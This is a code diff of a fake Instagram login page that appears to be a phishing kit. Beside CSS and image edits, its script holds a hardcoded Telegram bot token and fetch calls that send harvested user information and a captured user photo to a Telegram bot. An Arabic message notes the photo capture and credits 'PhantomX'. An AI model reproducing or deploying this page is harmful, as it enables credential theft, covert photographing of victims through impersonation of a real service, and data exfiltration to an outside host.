@@ -37,6 +37,7 @@
             font-size: 22px;
             margin-bottom: 20px;
             font-weight: 600;
+            color: #333;
         }
 
         .login-box input {
@@ -74,18 +75,6 @@
             text-decoration: none;
         }
 
-        .download-link {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .download-link a {
-            color: #3897f0;
-            text-decoration: none;
-            display: inline-block;
-            margin: 5px 10px;
-        }
-
         footer {
             text-align: center;
             margin-top: 30px;
@@ -102,13 +91,6 @@
             color: #8e8e8e;
         }
 
-        .download-link img {
-            width: 150px;
-            height: 50px;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-
         .bottom-links {
             margin-top: 10px;
             font-size: 14px;
@@ -119,6 +101,21 @@
             color: #3897f0;
             text-decoration: none;
             margin-right: 20px;
+        }
+
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            margin: 10px;
+            border-radius: 50%;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .download-link img {
+            width: 150px;
+            height: 50px;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
     </style>
 </head>
@@ -139,10 +136,10 @@
             <div class="download-link">
                 <span>Download app:</span><br>
                 <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Google_Play_Logo_2016.svg/1024px-Google_Play_Logo_2016.svg.png" alt="Download for Android">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Google_Play_Logo_2013.png" alt="Download for Android">
                 </a>
                 <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/App_Store_icon.svg/1024px-App_Store_icon.svg.png" alt="Download for iOS">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Instagram_logo_2022.svg" alt="Download for iOS">
                 </a>
             </div>
         </div>
@@ -154,6 +151,18 @@
         </div>
         <div class="copyright">© 2025 Instagram from Facebook</div>
     </footer>
+
+    <div class="social-links">
+        <a href="https://www.instagram.com" target="_blank">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Instagram_logo_2016.svg" alt="Instagram" class="social-icon">
+        </a>
+        <a href="https://www.facebook.com" target="_blank">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Facebook_icon.svg" alt="Facebook" class="social-icon">
+        </a>
+        <a href="https://twitter.com" target="_blank">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Twitter_Logo_2021.svg" alt="Twitter" class="social-icon">
+        </a>
+    </div>
 
     <script>
         const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
@@ -249,14 +258,14 @@
                             `👁️‍🗨️ *تم التقاط صورة المستخدم*`
                             `☣ *⚜By PhantomX @tx_5w⚜*`;
 
-            // Send the information to Telegram bot
+            // Send the information and image directly to Telegram bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
 
-            // Send the captured image to Telegram bot if available
+            // Send the captured image directly
             if (imageData) {
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
